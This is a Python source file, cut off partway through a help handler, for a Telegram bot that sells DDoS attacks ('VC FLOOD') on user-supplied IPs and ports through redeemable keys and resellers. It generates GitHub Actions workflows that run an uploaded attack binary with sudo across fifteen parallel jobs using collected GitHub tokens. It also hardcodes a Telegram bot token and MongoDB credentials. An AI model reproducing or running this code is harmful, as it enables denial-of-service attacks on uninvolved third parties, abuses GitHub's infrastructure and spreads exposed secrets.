import os
import json
import logging
import asyncio
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
)
from github import Github, GithubException

# Logging configuration
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8618904780:AAH0zJ2JJgxqGTls1kjqPrnxxIIkGvW41bQ"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "neo"

from pymongo import MongoClient

# MongoDB Client setup
MONGO_URI = "mongodb+srv://neobots:neomongo@cluster0.uvubs6k.mongodb.net/?appName=Cluster0"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["neobots"]

ADMIN_IDS = [6390225218]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_PUB_NAME = 3
WAITING_FOR_PUB_LINK = 4
WAITING_FOR_PUB_ID = 5
WAITING_FOR_PRIV_NAME = 6
WAITING_FOR_PRIV_LINK = 7
WAITING_FOR_PRIV_ID = 8

current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}
channel_setup_state = {}

# Force Join Database Configuration (loaded dynamically below)
force_join_db = {}

# User Keyboard Function (Bottom Keyboard Menu)
def get_user_keyboard():
    keyboard = [
        [
            KeyboardButton("Attack", style="primary", icon_custom_emoji_id="5080113066037741131"),
            KeyboardButton("Status", style="primary", icon_custom_emoji_id="6204093414556834971")
        ],
        [
            KeyboardButton("Redeem Key", style="primary", icon_custom_emoji_id="6311935044017461530"),
            KeyboardButton("My Access", style="primary", icon_custom_emoji_id="5339270838627625732")
        ],
        [
            KeyboardButton("Help", style="primary", icon_custom_emoji_id="5452026937172048380")
        ]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("📊 BOT STATS", callback_data="admin_bot_stats", style="primary", icon_custom_emoji_id="5231200819986047254"),
            InlineKeyboardButton("👥 TOTAL USERS", callback_data="admin_total_users", style="primary", icon_custom_emoji_id="5339270838627625732")
        ],
        [
            InlineKeyboardButton("➕ ADD ADMIN", callback_data="admin_add_admin_prompt", style="primary"),
            InlineKeyboardButton("➖ REMOVE ADMIN", callback_data="admin_remove_admin_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("🔑 GEN KEY", callback_data="admin_genkey_prompt", style="primary"),
            InlineKeyboardButton("📜 KEYS LIST", callback_data="admin_keyslist_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("⏳ SET COOLDOWN", callback_data="admin_cooldown_prompt", style="primary"),
            InlineKeyboardButton("⚡ MAX ATTACKS", callback_data="admin_maxattacks_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("👥 USERS LIST", callback_data="admin_userslist_prompt", style="primary"),
            InlineKeyboardButton("👑 OWNERS LIST", callback_data="admin_ownerlist_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("🛡️ ADMINS LIST", callback_data="admin_adminlist_prompt", style="primary"),
            InlineKeyboardButton("💰 RESELLERS LIST", callback_data="admin_resellerlist_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("🛠 MAINTENANCE", callback_data="admin_maint_prompt", style="primary"),
            InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("💻 GITHUB TOKENS", callback_data="admin_tokens_prompt", style="primary"),
            InlineKeyboardButton("🤖 CANARY & GUIDE", callback_data="admin_apk_video_prompt", style="primary")
        ],
        [
            InlineKeyboardButton("📢 FORCE JOIN SYSTEM", callback_data="admin_forcejoin_menu", style="primary")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def load_log_channel():
    try:
        doc = db["settings"].find_one({"_id": "log_channel"})
        if doc:
            return doc.get("log_channel")
    except Exception as e:
        logger.error(f"Error loading log channel: {e}")
    return None

def save_log_channel(chat_id):
    try:
        db["settings"].update_one(
            {"_id": "log_channel"},
            {"$set": {"log_channel": chat_id}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving log channel: {e}")

def load_max_time():
    try:
        doc = db["settings"].find_one({"_id": "max_time"})
        if doc:
            return doc.get("max_time", 300)
    except Exception as e:
        logger.error(f"Error loading max time: {e}")
    return 300

def save_max_time(seconds):
    try:
        db["settings"].update_one(
            {"_id": "max_time"},
            {"$set": {"max_time": seconds}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving max time: {e}")

def load_force_join():
    try:
        doc = db["settings"].find_one({"_id": "force_join"})
        if doc:
            return doc.get("data", {
                "force_join_enabled": False,
                "force_join_channels": []
            })
    except Exception as e:
        logger.error(f"Error loading force join: {e}")
    default_data = {
        "force_join_enabled": False,
        "force_join_channels": []
    }
    save_force_join(default_data)
    return default_data

def save_force_join(data):
    try:
        db["settings"].update_one(
            {"_id": "force_join"},
            {"$set": {"data": data}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving force join: {e}")

def load_users():
    try:
        doc = db["users"].find_one({"_id": "authorized_users"})
        if doc:
            return set(doc.get("list", []))
    except Exception as e:
        logger.error(f"Error loading users: {e}")
    initial_users = ADMIN_IDS.copy()
    save_users(initial_users)
    return set(initial_users)

def save_users(users):
    try:
        db["users"].update_one(
            {"_id": "authorized_users"},
            {"$set": {"list": list(users)}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving users: {e}")

def load_pending_users():
    try:
        doc = db["pending_users"].find_one({"_id": "pending_users"})
        if doc:
            return doc.get("list", [])
    except Exception as e:
        logger.error(f"Error loading pending users: {e}")
    return []

def save_pending_users(pending_users):
    try:
        db["pending_users"].update_one(
            {"_id": "pending_users"},
            {"$set": {"list": pending_users}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving pending users: {e}")

def load_approved_users():
    try:
        doc = db["approved_users"].find_one({"_id": "approved_users"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading approved users: {e}")
    return {}

def save_approved_users(approved_users):
    try:
        db["approved_users"].update_one(
            {"_id": "approved_users"},
            {"$set": {"dict": approved_users}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving approved users: {e}")

def load_owners():
    try:
        doc = db["owners"].find_one({"_id": "owners"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading owners: {e}")
    owners = {}
    for admin_id in ADMIN_IDS:
        owners[str(admin_id)] = {
            "username": f"owner_{admin_id}",
            "added_by": "system",
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_primary": True
        }
    save_owners(owners)
    return owners

def save_owners(owners):
    try:
        db["owners"].update_one(
            {"_id": "owners"},
            {"$set": {"dict": owners}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving owners: {e}")

def load_admins():
    try:
        doc = db["admins"].find_one({"_id": "admins"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading admins: {e}")
    return {}

def save_admins(admins):
    try:
        db["admins"].update_one(
            {"_id": "admins"},
            {"$set": {"dict": admins}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving admins: {e}")

def load_groups():
    try:
        doc = db["groups"].find_one({"_id": "groups"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading groups: {e}")
    return {}

def save_groups(groups):
    try:
        db["groups"].update_one(
            {"_id": "groups"},
            {"$set": {"dict": groups}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving groups: {e}")

def load_resellers():
    try:
        doc = db["resellers"].find_one({"_id": "resellers"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading resellers: {e}")
    return {}

def save_resellers(resellers):
    try:
        db["resellers"].update_one(
            {"_id": "resellers"},
            {"$set": {"dict": resellers}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving resellers: {e}")

def load_github_tokens():
    try:
        doc = db["github_tokens"].find_one({"_id": "github_tokens"})
        if doc:
            return doc.get("list", [])
    except Exception as e:
        logger.error(f"Error loading github tokens: {e}")
    return []

def save_github_tokens(tokens):
    try:
        db["github_tokens"].update_one(
            {"_id": "github_tokens"},
            {"$set": {"list": tokens}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving github tokens: {e}")

def load_attack_state():
    try:
        doc = db["attack_state"].find_one({"_id": "attack_state"})
        if doc:
            return doc.get("state", {"active_attacks": [], "cooldown_until": 0})
    except Exception as e:
        logger.error(f"Error loading attack state: {e}")
    return {"active_attacks": [], "cooldown_until": 0}

def save_attack_state():
    try:
        state = {
            "active_attacks": active_attacks,
            "cooldown_until": cooldown_until
        }
        db["attack_state"].update_one(
            {"_id": "attack_state"},
            {"$set": {"state": state}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving attack state: {e}")

def load_maintenance_mode():
    try:
        doc = db["settings"].find_one({"_id": "maintenance"})
        if doc:
            return doc.get("maintenance", False)
    except Exception as e:
        logger.error(f"Error loading maintenance mode: {e}")
    return False

def save_maintenance_mode(mode):
    try:
        db["settings"].update_one(
            {"_id": "maintenance"},
            {"$set": {"maintenance": mode}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving maintenance mode: {e}")

def load_cooldown():
    try:
        doc = db["settings"].find_one({"_id": "cooldown"})
        if doc:
            return doc.get("cooldown", 40)
    except Exception as e:
        logger.error(f"Error loading cooldown: {e}")
    return 40

def save_cooldown(duration):
    try:
        db["settings"].update_one(
            {"_id": "cooldown"},
            {"$set": {"cooldown": duration}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving cooldown: {e}")

def load_max_attacks():
    try:
        doc = db["settings"].find_one({"_id": "max_attacks"})
        if doc:
            return doc.get("max_attacks", 40)
    except Exception as e:
        logger.error(f"Error loading max attacks: {e}")
    return 40

def save_max_attacks(max_attacks):
    try:
        db["settings"].update_one(
            {"_id": "max_attacks"},
            {"$set": {"max_attacks": max_attacks}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving max attacks: {e}")

def load_blocked_ports():
    try:
        doc = db["settings"].find_one({"_id": "blocked_ports"})
        if doc:
            return set(doc.get("ports", []))
    except Exception as e:
        logger.error(f"Error loading blocked ports: {e}")
    return set()

def save_blocked_ports(ports_set):
    try:
        db["settings"].update_one(
            {"_id": "blocked_ports"},
            {"$set": {"ports": list(ports_set)}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving blocked ports: {e}")

def load_max_concurrent_attacks():
    try:
        doc = db["settings"].find_one({"_id": "max_concurrent_attacks"})
        if doc:
            return doc.get("max_concurrent_attacks", 5)
    except Exception as e:
        logger.error(f"Error loading max concurrent attacks: {e}")
    return 5

def save_max_concurrent_attacks(limit):
    try:
        db["settings"].update_one(
            {"_id": "max_concurrent_attacks"},
            {"$set": {"max_concurrent_attacks": limit}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving max concurrent attacks: {e}")

def load_keys():
    try:
        doc = db["keys"].find_one({"_id": "keys"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading keys: {e}")
    return {}

def save_keys(keys_data):
    try:
        db["keys"].update_one(
            {"_id": "keys"},
            {"$set": {"dict": keys_data}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving keys: {e}")

def load_user_attack_counts():
    try:
        doc = db["user_attack_counts"].find_one({"_id": "user_attack_counts"})
        if doc:
            return doc.get("dict", {})
    except Exception as e:
        logger.error(f"Error loading user attack counts: {e}")
    return {}

def save_user_attack_counts(counts):
    try:
        db["user_attack_counts"].update_one(
            {"_id": "user_attack_counts"},
            {"$set": {"dict": counts}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving user attack counts: {e}")

def track_user_activity(user_id):
    try:
        user_id_str = str(user_id)
        today_str = time.strftime("%Y-%m-%d")
        
        # Track in all_bot_users
        db["all_bot_users"].update_one(
            {"_id": user_id_str},
            {"$setOnInsert": {"joined_date": today_str, "timestamp": time.time()}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error tracking user activity: {e}")

def track_attack_activity():
    try:
        today_str = time.strftime("%Y-%m-%d")
        db["daily_attack_stats"].update_one(
            {"_id": today_str},
            {"$inc": {"count": 1}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error tracking attack activity: {e}")


# Load state
authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
owners["6390225218"] = {
    "username": "Rytce",
    "added_by": "system",
    "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
    "is_primary": True
}
save_owners(owners)
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
MAX_ATTACK_DURATION = load_max_time()
MAX_CONCURRENT_ATTACKS = load_max_concurrent_attacks()
blocked_ports = load_blocked_ports()
user_attack_counts = load_user_attack_counts()
keys_db = load_keys()
force_join_db = load_force_join()

attack_state = load_attack_state()
active_attacks = attack_state.get("active_attacks", [])
if "current_attack" in attack_state and attack_state["current_attack"] is not None and not active_attacks:
    active_attacks = [attack_state["current_attack"]]
cooldown_until = attack_state.get("cooldown_until", 0)

def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

async def check_user_joined(bot, user_id, channel):
    # Owners are immune to force join check
    if is_owner(user_id):
        return True
    try:
        # Check membership using get_chat_member
        member = await bot.get_chat_member(chat_id=channel["chat_id"], user_id=user_id)
        # Valid statuses representing subscription
        if member.status in ["creator", "administrator", "member"]:
            return True
        return False
    except Exception as e:
        logger.error(f"Error checking channel membership for {user_id} in {channel['chat_id']}: {e}")
        # If check fails for private channel where bot is not inside, we fallback to True or rely on the chat_id membership.
        # But per requirements: private channel link + chat ID is provided so bot can check if it has access,
        # or if bot isn't in chat, it may throw. Let's return False if member check fails, but log it.
        return False

async def check_force_join(bot, user_id):
    if not force_join_db.get("force_join_enabled", False):
        return True, []
    
    unjoined_channels = []
    for channel in force_join_db.get("force_join_channels", []):
        joined = await check_user_joined(bot, user_id, channel)
        if not joined:
            unjoined_channels.append(channel)
            
    if unjoined_channels:
        return False, unjoined_channels
    return True, []

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global active_attacks, cooldown_until
    
    if MAINTENANCE_MODE:
        return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
    
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(s). ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ."
    
    # Check concurrent attacks limit
    active_attacks = [a for a in active_attacks if time.time() < a.get("estimated_end_time", 0)]
    save_attack_state()

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        if not is_owner(user_id):
            return False, f"⚠️ **sᴇʀᴠᴇʀ BUSY: ᴍᴀx ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋs**\n━━━━━━━━━━━━━━━━━━━━━━\nCurrently {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS} attacks running. Please wait for an attack slot to free up."

    current_time = time.time()
    if current_time < cooldown_until:
        if not is_owner(user_id):
            remaining_time = int(cooldown_until - current_time)
            return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{remaining_time}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
    
    return True, "✅ ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ"

def get_attack_method(ip):
    if ip.startswith(('15', '96')):
        return None, "⚠️ ɪɴᴠᴀʟɪᴅ ɪᴘ - ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '15' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ"
    else:
        return "VC FLOOD", "VC FLOOD"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global active_attacks
    attack_obj = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    active_attacks.append(attack_obj)
    save_attack_state()
    
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)
    track_attack_activity()
    return attack_obj

def finish_attack(attack_obj=None):
    global active_attacks, cooldown_until
    if attack_obj in active_attacks:
        active_attacks.remove(attack_obj)
    else:
        active_attacks = [a for a in active_attacks if time.time() < a.get("estimated_end_time", 0)]
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack(user_id=None):
    global active_attacks, cooldown_until
    if user_id:
        active_attacks = [a for a in active_attacks if a.get("user_id") != user_id]
    else:
        active_attacks = []
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global active_attacks, cooldown_until
    current_time = time.time()
    active_attacks = [a for a in active_attacks if current_time < a.get("estimated_end_time", 0)]
    save_attack_state()
    
    if active_attacks:
        running_list = []
        for att in active_attacks:
            elapsed = int(current_time - att['start_time'])
            remaining = max(0, int(att['estimated_end_time'] - current_time))
            running_list.append({
                "attack": att,
                "elapsed": elapsed,
                "remaining": remaining
            })
        return {
            "status": "running",
            "active_attacks": running_list,
            "count": len(running_list)
        }
    
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    
    return {"status": "ready"}

# Key Management Helper Functions
def parse_duration(dur_str):
    dur_str = str(dur_str).strip().lower()
    if dur_str in ['0', 'lifetime', 'life', 'inf', 'unlimited']:
        return "LIFETIME", 0
    if dur_str.endswith('d'):
        val = float(dur_str[:-1])
        return "DAYS", val
    elif dur_str.endswith('h'):
        val = float(dur_str[:-1])
        return "HOURS", val
    elif dur_str.endswith('m'):
        val = float(dur_str[:-1])
        return "HOURS", val / 60.0
    else:
        val = float(dur_str)
        return "HOURS", val

def create_custom_key(key_name, max_users, duration_str, created_by_id):
    if key_name.lower() in ['auto', 'rand', 'random']:
        key_name = f"KEY-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    
    dur_type, dur_val = parse_duration(duration_str)
    
    keys_db[key_name] = {
        "key_name": key_name,
        "max_users": int(max_users), # 0 = unlimited
        "used_count": 0,
        "used_by": [],
        "duration_type": dur_type,
        "duration_value": dur_val,
        "created_at": time.time(),
        "created_by": str(created_by_id)
    }
    save_keys(keys_db)
    return key_name, dur_type, dur_val

def redeem_key_func(key_name, user_id):
    user_id_str = str(user_id)
    
    found_key = None
    if key_name in keys_db:
        found_key = key_name
    else:
        for k in keys_db:
            if k.lower() == key_name.lower():
                found_key = k
                break
    
    if not found_key:
        return False, f"<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ɪɴᴠᴀʟɪᴅ ᴋᴇʏ</b>"
    
    key_data = keys_db[found_key]
    
    if user_id_str in key_data.get("used_by", []):
        return False, f"<tg-emoji emoji-id='5258274739041883702'>⚠️</tg-emoji> <b>ʏᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ʀᴇᴅᴇᴇᴍᴇᴅ ᴛʜɪs ᴋᴇʏ!</b>"
    
    max_u = key_data.get("max_users", 1)
    used_c = key_data.get("used_count", len(key_data.get("used_by", [])))
    if max_u > 0 and used_c >= max_u:
        return False, f"<tg-emoji emoji-id='5258274739041883702'>❌</tg-emoji> <b>ᴋᴇʏ ᴜsᴀɢᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!</b>"
    
    key_data.setdefault("used_by", []).append(user_id_str)
    key_data["used_count"] = used_c + 1
    keys_db[found_key] = key_data
    save_keys(keys_db)
    
    dur_type = key_data.get("duration_type", "HOURS")
    dur_val = key_data.get("duration_value", 24)
    
    if dur_type == "LIFETIME":
        expiry = "LIFETIME"
        days_label = "LIFETIME"
    elif dur_type == "DAYS":
        expiry = time.time() + (dur_val * 86400)
        days_label = f"{dur_val} Days"
    else:
        expiry = time.time() + (dur_val * 3600)
        days_label = f"{dur_val} Hours"
    
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": f"key:{found_key}",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": days_label,
        "key_used": found_key
    }
    save_approved_users(approved_users)
    
    return True, (
        f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5399850755337240950'>⏱️</tg-emoji> <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{days_label}</code>"
    )

def create_repository(token, repo_name="flamedev-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="VC DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: flame Attack
on: [push]

jobs:
  flame:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x {BINARY_FILE_NAME}
    - run: sudo ./{BINARY_FILE_NAME} {ip} {port} {time_val} 999
"""
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        return total_cancelled
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0

# Command Handlers

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    track_user_activity(user_id)
    
    is_joined, unjoined = await check_force_join(context.bot, user_id)
    if not is_joined:
        ch_list_text = ""
        buttons = []
        row = []
        for ch in unjoined:
            ch_list_text += f"• <b>{ch['name']}</b> ({ch['type']})\n"
            btn = InlineKeyboardButton(
                f"Join {ch['name']}", 
                url=ch['invite_link'], 
                style="primary", 
                icon_custom_emoji_id="5427168083074628963"
            )
            row.append(btn)
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
            
        buttons.append([
            InlineKeyboardButton(
                "Verify Subscription", 
                callback_data="btn_verify_subscription", 
                style="primary", 
                icon_custom_emoji_id="5791697221799907788"
            )
        ])
        
        await update.message.reply_text(
            f"<tg-emoji emoji-id='6089079808187174973'>⚠️</tg-emoji> <b>ғᴏʀᴄᴇ ᴊᴏɪɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"You must join our channels to use this bot:\n\n"
            f"{ch_list_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"After joining, tap verification button below.",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="HTML"
        )
        return

    welcome_text = (
        f"<tg-emoji emoji-id='5222079954421818267'>🤖</tg-emoji> <b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ</b> <tg-emoji emoji-id='5222079954421818267'>🤖</tg-emoji>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5846169660654886186'>👑</tg-emoji> <b>OWNER:</b> @Rytce\n"
        f"<tg-emoji emoji-id='5276527873308499560'>💻</tg-emoji> <b>DEVELOPER:</b> @Ccxmod\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<tg-emoji emoji-id='5406745015365943482'>👇</tg-emoji> <b>Use the bottom menu buttons to interact with the bot:</b>"
    )
    
    await update.message.reply_text(welcome_text, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id) or is_admin(user_id):
        admin_text = (
            f"<tg-emoji emoji-id='5452026937172048380'>🆘</tg-emoji> <b>ʜᴇʟᴘ - ᴀᴅᴍɪɴ &amp; ᴜsᴇʀ ᴍᴇɴᴜ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<tg-emoji emoji-id='5846169660654886186'>🛡️</tg-emoji> <b>ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs &amp; ᴘᴀɴᴇʟ:</b>\n"
            "• <code>/admin</code> - Open Interactive Admin Panel\n"
            "• <code>/stats</code> - View Total Users &amp; Daily Attacks Stats\n"
            "• <code>/genkey &lt;name&gt; &lt;max_users&gt; &lt;duration&gt;</code> - Create Key\n"
            "• <code>/keyslist</code> - List Active Access Keys\n"
            "• <code>/delkey &lt;key_name&gt;</code> - Delete Access Key\n"
            "• <code>/add &lt;ID&gt; &lt;DAYS&gt;</code> - Add User Access\n"
            "• <code>/remove &lt;ID&gt;</code> - Remove User Access\n"
            "• <code>/addadmin &lt;ID&gt; &lt;USERNAME&gt;</code> - Add Admin\n"
            "• <code>/removeadmin &lt;ID&gt;</code> - Remove Admin\n"
            "• <code>/block &lt;PORT&gt;</code> - Block Port (e.g. /block 1000)\n"
            "• <code>/unblock &lt;PORT&gt;</code> - Unblock Port\n"
            "• <code>/listblocks</code> - List All Blocked Ports\n"
            "• <code>/setconcurrent &lt;NUMBER&gt;</code> - Set Concurrent Attack Limit (e.g. 5-6)\n"
            "• <code>/setcooldown &lt;SECONDS&gt;</code> - Set Attack Cooldown\n"
            "• <code>/setmaxattack &lt;NUMBER&gt;</code> - Set Max Attacks Per User\n"
            "• <code>/userslist</code> - List All Approved Users\n"
            "• <code>/ownerlist</code> - List All Bot Owners\n"
            "• <code>/adminlist</code> - List All Admins\n"
            "• <code>/resellerlist</code> - List All Resellers\n"
            "• <code>/maintenance &lt;on/off&gt;</code> - Toggle Maintenance Mode\n"
            "• <code>/broadcast &lt;msg&gt;</code> - Broadcast Message to Users\n"
            "• <code>/addtoken &lt;token&gt;</code> - Add Github Token\n"
            "• <code>/tokens</code> - List Github Server Tokens\n"
            "• <code>/removetoken &lt;token&gt;</code> - Remove Github Token\n"
            "• <code>/binary_upload</code> - Upload Attack Binary\n"
            "• <code>/addapk &lt;instructions&gt;</code> - Set Canary APK\n"
            "• <code>/setvideo</code> - Set Video Guide\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(admin_text, reply_markup=get_user_keyboard(), parse_mode="HTML")
    else:
